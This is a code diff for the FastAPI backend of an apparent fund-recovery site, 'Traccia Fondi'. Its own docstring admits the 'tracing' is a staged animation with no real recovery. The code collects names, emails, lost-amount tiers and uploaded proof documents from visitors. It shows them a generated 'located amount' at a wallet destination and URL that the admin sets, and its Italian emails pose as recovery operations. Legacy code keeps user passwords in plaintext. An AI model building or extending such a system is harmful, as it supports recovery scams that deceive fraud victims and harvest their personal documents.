@@ -1,26 +1,20 @@
 """
-Traccia Fondi Backend (Admin-controlled accounts)
+Traccia Fondi Backend (Code-based access)
 ============================================
 
-- Public user registration is DISABLED (returns helpful message).
-- Admin (hardcoded credentials in .env) can: create, list, edit, delete users.
-- User passwords are stored in PLAINTEXT (admin sees them), per requirements.
-- Each user has: first_name, last_name, email, password, recovery_destination
-  (chiantin_bank | zenthos_wallet), amount_lost_tier (set by user after login),
-  located_amount (computed at "start procedure" time).
-- Users login with the credentials given by admin.
-- After login, user picks an amount tier and starts the 2-minute "recovery
-  procedure" animation. At the end, the system reports their funds were
-  "located" at the destination chosen by the admin.
-- After the animation the user submits a Recovery Request (name, surname, email,
-  message). The admin sees these and can compose an email manually (mailto)
-  including credentials he types into the admin panel for that specific request.
+NEW FLOW (v3):
+- Users enter: first_name, last_name, email, access_code, amount_tier
+- Optional: Upload proof documents
+- Access code is set globally by admin (reusable for all users)
+- One trace per email (cannot trace again with same email)
+- Admin sets: access_code, destination_name, destination_url
+- Admin sees all traces with user info, amount generated, documents, date/time
 
 NOTE: This is an UI-driven product. The "tracing" is staged animation. There is
 NO real fund recovery happening.
 """
 
-from fastapi import FastAPI, APIRouter, Depends, HTTPException, Header, UploadFile, File, Request
+from fastapi import FastAPI, APIRouter, Depends, HTTPException, Header, UploadFile, File, Request, Form
 from dotenv import load_dotenv
 from starlette.middleware.cors import CORSMiddleware
 from motor.motor_asyncio import AsyncIOMotorClient
@@ -114,6 +108,10 @@ api = APIRouter(prefix="/api")
 # ============================================================
 #   Helpers
 # ============================================================
+
+# Initialize logger early so it can be used throughout
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+logger = logging.getLogger("traccia-fondi")
 
 def _now_iso() -> str:
     return datetime.now(timezone.utc).isoformat()
@@ -252,6 +250,26 @@ class RecoveryEmailUpdate(BaseModel):
     extra_notes: Optional[str] = None
 
 
+# --- NEW: Global Settings (admin-controlled) ---
+class GlobalSettingsUpdate(BaseModel):
+    access_code: Optional[str] = None
+    destination_name: Optional[str] = None
+    destination_url: Optional[str] = None
+
+
+# --- NEW: Public Trace (code-based access) ---
+class StartTraceIn(BaseModel):
+    first_name: str = Field(min_length=1, max_length=100)
+    last_name: str = Field(min_length=1, max_length=100)
+    email: EmailStr
+    access_code: str = Field(min_length=1, max_length=50)
+    amount_tier: str  # 5000_20000 / 20000_50000 / 50000_100000 / 100000_plus
+
+
+class CheckEmailIn(BaseModel):
+    email: EmailStr
+
+
 # ============================================================
 #   Routes — health + auth
 # ============================================================
@@ -311,7 +329,260 @@ async def me(authorization: Optional[str] = Header(None)):
 
 
 # ============================================================
-#   Admin user management (PLAINTEXT passwords visible)
+#   NEW: Global Settings (admin-controlled)
+# ============================================================
+
+DEFAULT_SETTINGS = {
+    "id": "global",
+    "access_code": "TRACE2026",
+    "destination_name": "Zenthos Wallet",
+    "destination_url": "https://zenthos-wallet.com",
+}
+
+
+async def get_settings() -> dict:
+    """Get global settings, creating defaults if not exist."""
+    settings = await db.settings.find_one({"id": "global"}, {"_id": 0})
+    if not settings:
+        await db.settings.insert_one(DEFAULT_SETTINGS.copy())
+        return DEFAULT_SETTINGS.copy()
+    return settings
+
+
+@api.get("/settings")
+async def public_get_settings():
+    """Public endpoint - only returns destination_name (not code or URL)."""
+    settings = await get_settings()
+    return {"destination_name": settings.get("destination_name", "Zenthos Wallet")}
+
+
+@api.get("/admin/settings")
+async def admin_get_settings(_=Depends(require_admin)):
+    """Admin: get all settings including access code."""
+    return await get_settings()
+
+
+@api.put("/admin/settings")
+async def admin_update_settings(body: GlobalSettingsUpdate, _=Depends(require_admin)):
+    """Admin: update global settings."""
+    update = {k: v for k, v in body.model_dump().items() if v is not None}
+    if not update:
+        raise HTTPException(400, "No fields to update")
+    await db.settings.update_one(
+        {"id": "global"},
+        {"$set": update},
+        upsert=True
+    )
+    return await get_settings()
+
+
+# ============================================================
+#   NEW: Public Trace System (code-based access)
+# ============================================================
+
+@api.post("/trace/check-email")
+async def check_email_used(body: CheckEmailIn, request: Request):
+    """Check if an email has already been used for tracing."""
+    ip = request.client.host if request.client else "unknown"
+    _rate_limit(f"check-email:{ip}", max_requests=20, window_seconds=60)
+    
+    em = body.email.lower().strip()
+    existing = await db.traces.find_one({"email": em})
+    return {"used": existing is not None}
+
+
+@api.post("/trace/start")
+async def start_trace(body: StartTraceIn, request: Request):
+    """
+    Start a new trace. Validates access code, checks email uniqueness,
+    generates located amount, and creates trace record.
+    """
+    ip = request.client.host if request.client else "unknown"
+    _rate_limit(f"trace:{ip}", max_requests=5, window_seconds=300)
+    
+    # Validate amount tier
+    if body.amount_tier not in TIER_HIGH_END:
+        raise HTTPException(400, "Invalid amount_tier")
+    
+    # Get settings and validate code
+    settings = await get_settings()
+    if body.access_code.strip() != settings.get("access_code", ""):
+        raise HTTPException(401, "Invalid access code")
+    
+    # Check email uniqueness
+    em = body.email.lower().strip()
+    existing = await db.traces.find_one({"email": em})
+    if existing:
+        raise HTTPException(400, "This email has already been used for a trace. Each email can only trace once.")
+    
+    # Generate located amount
+    located = _located_amount_for(body.amount_tier)
+    
+    # Create trace record
+    trace = {
+        "id": _new_id(),
+        "first_name": body.first_name.strip(),
+        "last_name": body.last_name.strip(),
+        "email": em,
+        "amount_tier": body.amount_tier,
+        "located_amount": located,
+        "destination_name": settings.get("destination_name", "Zenthos Wallet"),
+        "destination_url": settings.get("destination_url", ""),
+        "documents": [],  # Will be populated via upload endpoint
+        "status": "started",  # started | completed
+        "created_at": _now_iso(),
+        "completed_at": None,
+    }
+    await db.traces.insert_one(trace)
+    trace.pop("_id", None)
+    
+    return {
+        "trace_id": trace["id"],
+        "located_amount": located,
+        "destination_name": trace["destination_name"],
+        "destination_url": trace["destination_url"],
+    }
+
+
+@api.post("/trace/{trace_id}/complete")
+async def complete_trace(trace_id: str, request: Request):
+    """Mark a trace as completed."""
+    ip = request.client.host if request.client else "unknown"
+    _rate_limit(f"trace-complete:{ip}", max_requests=10, window_seconds=60)
+    
+    trace = await db.traces.find_one({"id": trace_id})
+    if not trace:
+        raise HTTPException(404, "Trace not found")
+    
+    await db.traces.update_one(
+        {"id": trace_id},
+        {"$set": {"status": "completed", "completed_at": _now_iso()}}
+    )
+    return {"ok": True}
+
+
+@api.get("/trace/{trace_id}")
+async def get_trace(trace_id: str, request: Request):
+    """Get trace details (public, for showing results)."""
+    ip = request.client.host if request.client else "unknown"
+    _rate_limit(f"trace-get:{ip}", max_requests=30, window_seconds=60)
+    
+    trace = await db.traces.find_one({"id": trace_id}, {"_id": 0})
+    if not trace:
+        raise HTTPException(404, "Trace not found")
+    
+    return trace
+
+
+@api.post("/trace/{trace_id}/upload")
+async def upload_trace_document(
+    trace_id: str,
+    file: UploadFile = File(...),
+    request: Request = None
+):
+    """Upload a proof document for a trace."""
+    ip = request.client.host if request.client else "unknown"
+    _rate_limit(f"trace-upload:{ip}", max_requests=15, window_seconds=300)
+    
+    trace = await db.traces.find_one({"id": trace_id})
+    if not trace:
+        raise HTTPException(404, "Trace not found")
+    
+    # Check document limit
+    current_docs = trace.get("documents", [])
+    if len(current_docs) >= MAX_DOCS_PER_USER:
+        raise HTTPException(400, f"Maximum {MAX_DOCS_PER_USER} documents per trace")
+    
+    # MIME check
+    if file.content_type not in ALLOWED_MIME:
+        raise HTTPException(400, f"File type not allowed: {file.content_type}")
+    
+    # Size check
+    contents = await file.read()
+    if len(contents) > MAX_FILE_BYTES:
+        raise HTTPException(400, f"File too large (max {MAX_FILE_BYTES // (1024*1024)} MB)")
+    
+    # Upload to Cloudinary
+    folder = f"traccia-fondi/traces/{trace_id}"
+    is_pdf = file.content_type == "application/pdf"
+    try:
+        resource_type = "raw" if is_pdf else "image"
+        result = cloudinary.uploader.upload(
+            contents,
+            folder=folder,
+            resource_type=resource_type,
+            use_filename=True,
+            unique_filename=True,
+            overwrite=False,
+            tags=["traccia-fondi", "trace-doc", trace_id],
+        )
+    except Exception as e:
+        logger.exception("Cloudinary upload failed")
+        raise HTTPException(500, f"Upload failed: {e}")
+    
+    doc = {
+        "id": _new_id(),
+        "original_name": file.filename or "document",
+        "mime_type": file.content_type,
+        "size_bytes": len(contents),
+        "cloudinary_public_id": result.get("public_id"),
+        "cloudinary_resource_type": resource_type,
+        "url": result.get("secure_url"),
+        "created_at": _now_iso(),
+    }
+    
+    await db.traces.update_one(
+        {"id": trace_id},
+        {"$push": {"documents": doc}}
+    )
+    
+    return doc
+
+
+# ============================================================
+#   Admin: Traces Management
+# ============================================================
+
+@api.get("/admin/traces")
+async def admin_list_traces(_=Depends(require_admin)):
+    """Admin: list all traces with full details."""
+    traces = await db.traces.find({}, {"_id": 0}).sort("created_at", -1).to_list(2000)
+    return traces
+
+
+@api.get("/admin/traces/{trace_id}")
+async def admin_get_trace(trace_id: str, _=Depends(require_admin)):
+    """Admin: get single trace with full details."""
+    trace = await db.traces.find_one({"id": trace_id}, {"_id": 0})
+    if not trace:
+        raise HTTPException(404, "Trace not found")
+    return trace
+
+
+@api.delete("/admin/traces/{trace_id}")
+async def admin_delete_trace(trace_id: str, _=Depends(require_admin)):
+    """Admin: delete a trace and its documents from Cloudinary."""
+    trace = await db.traces.find_one({"id": trace_id})
+    if not trace:
+        raise HTTPException(404, "Trace not found")
+    
+    # Delete documents from Cloudinary
+    for doc in trace.get("documents", []):
+        try:
+            cloudinary.uploader.destroy(
+                doc["cloudinary_public_id"],
+                resource_type=doc.get("cloudinary_resource_type", "image"),
+                invalidate=True,
+            )
+        except Exception:
+            logger.warning("Cloudinary destroy failed for %s", doc.get("cloudinary_public_id"))
+    
+    await db.traces.delete_one({"id": trace_id})
+    return {"ok": True}
+
+
+# ============================================================
+#   Admin user management (PLAINTEXT passwords visible) - LEGACY
 # ============================================================
 
 @api.get("/admin/users")
@@ -506,11 +777,11 @@ async def admin_send_email(req_id: str, _=Depends(require_admin)):
         f"Acceda al suo account per verificare i fondi localizzati e seguire le istruzioni a schermo "
         f"per completare la procedura di recupero.\n\n"
         + (f"Note aggiuntive:\n{extra}\n\n" if extra else "")
-        + f"Importante: mantenga riservate le credenziali. Traccia Fondi non le chiederà mai di "
-        f"condividere password, codici OTP, seed phrase, o di installare software di accesso remoto.\n\n"
-        f"Cordiali saluti,\n"
-        f"Traccia Fondi — Recovery Operations\n"
-        f"support@traccia-fondi.com"
+        + "Importante: mantenga riservate le credenziali. Traccia Fondi non le chiederà mai di "
+        "condividere password, codici OTP, seed phrase, o di installare software di accesso remoto.\n\n"
+        "Cordiali saluti,\n"
+        "Traccia Fondi — Recovery Operations\n"
+        "support@traccia-fondi.com"
     )
 
     html_body = f"""<!doctype html>
@@ -758,9 +1029,6 @@ async def security_headers(request: Request, call_next):
     response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=(), payment=()"
     response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
     return response
-
-logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
-logger = logging.getLogger("traccia-fondi")
 
 
 @app.on_event("shutdown")
